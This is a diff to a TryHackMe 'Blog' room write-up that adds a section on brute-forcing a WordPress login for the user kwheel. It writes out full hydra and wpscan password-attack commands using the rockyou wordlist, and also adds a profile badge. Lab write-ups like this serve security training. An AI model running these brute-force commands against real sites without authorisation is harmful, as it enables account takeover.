@@ -133,7 +133,17 @@ Let's see if we can enumerate some username to brute-force the administration pa
 
 Nice, we have the username : bjoel, kwheel
 
-[](http://blog.thm/wp-json/wp/v2/users)
+Brute-force with hydra
+
+```bash
+hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1&redirect_to:blog.thm/wp-admin/'
+```
+
+With wpscan
+
+```bash
+wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
+```
 
 ![https://imgur.com/NFazDUA.png](https://imgur.com/NFazDUA.png)
 
@@ -216,3 +226,9 @@ Wordpress
 ```bash
 5.0
 ```
+
+<center>
+  <a href="https://tryhackme.com/p/boperXD" target="_blank">
+    <img src="https://i.imgur.com/hejzVWP.png" alt="TryhackMeProfile" />
+  </a>
+</center>
